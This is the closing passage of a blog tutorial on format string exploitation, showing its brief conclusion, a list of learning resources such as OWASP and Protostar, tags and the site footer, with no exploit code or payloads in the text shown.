<span class="nf">gdb</span><span class="o">-</span><span class="nv">peda$</span> 
</code></pre></div></div>

<p>You got it !</p>

<h2 id="conclusion">Conclusion<a class="header-link" href="https://axcheron.github.io/exploit-101-format-strings/#conclusion" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h2>

<p>You made it ! Learning format strings exploitation is not an easy task but, try to do some <em>wargames</em> online. With a bit more practice, you will be able to solve them easily ;)</p>

<h2 id="resources">Resources<a class="header-link" href="https://axcheron.github.io/exploit-101-format-strings/#resources" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h2>

<ul>
  <li><a href="http://www.cplusplus.com/reference/cstdio/printf/">printf() - C++ Reference</a></li>
  <li><a href="http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html">Introduction to format string exploits</a></li>
  <li><a href="https://www.owasp.org/index.php/Format_string_attack">OWASP - Format string attack</a></li>
  <li><a href="https://exploit-exercises.com/protostar/">Exploit Exercises - Protostar</a></li>
</ul>


        
      </section>

      <footer class="page__meta">
        
        
  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="https://axcheron.github.io/tags/#exploit" class="page__taxonomy-item" rel="tag">exploit</a><span class="sep">, </span>
    
      
      
      <a href="https://axcheron.github.io/tags/#gdb" class="page__taxonomy-item" rel="tag">gdb</a><span class="sep">, </span>
    
      
      
      <a href="https://axcheron.github.io/tags/#linux" class="page__taxonomy-item" rel="tag">linux</a>
    
    </span>
  </p>




        
  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2018-04-22T00:00:00+00:00">April 22, 2018</time></p>


      </footer>

      <section class="page__share">
  
    <h4 class="page__share-title">Share on</h4>
  

  <a href="https://twitter.com/intent/tweet?via=axcheron&amp;text=Exploit+101+-+Format+Strings%20https%3A%2F%2Faxcheron.github.io%2Fexploit-101-format-strings%2F" class="btn btn--twitter" onclick="window.open(this.href, &#39;window&#39;, &#39;left=20,top=20,width=500,height=500,toolbar=1,resizable=0&#39;); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>

  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Faxcheron.github.io%2Fexploit-101-format-strings%2F" class="btn btn--facebook" onclick="window.open(this.href, &#39;window&#39;, &#39;left=20,top=20,width=500,height=500,toolbar=1,resizable=0&#39;); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>

  <a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3A%2F%2Faxcheron.github.io%2Fexploit-101-format-strings%2F" class="btn btn--linkedin" onclick="window.open(this.href, &#39;window&#39;, &#39;left=20,top=20,width=500,height=500,toolbar=1,resizable=0&#39;); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
</section>


      
  <nav class="pagination">
    
      <a href="https://axcheron.github.io/code-injection-with-python/" class="pagination--pager" title="Code Injection with Python
">Previous</a>
    
    
      <a href="https://axcheron.github.io/playing-with-ld_preload/" class="pagination--pager" title="Playing with LD_PRELOAD
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
  
</div>

    </div>

    

    <div id="footer" class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    
      <li><strong>Follow:</strong></li>
    

    
      
        
          <li><a href="https://twitter.com/axcheron" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter</a></li>
        
      
        
      
        
          <li><a href="https://github.com/axcheron" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
        
      
        
      
        
      
        
      
    

    <li><a href="https://axcheron.github.io/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>
</div>

<div class="page__footer-copyright">© 2020 Alexandre CHERON. Powered by <a href="https://jekyllrb.com/" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>

      </footer>
    </div>

    
  <script src="./Exploit 101 - Format Strings - BreakInSecurity_files/main.min.js.download"></script>










  

</body></html>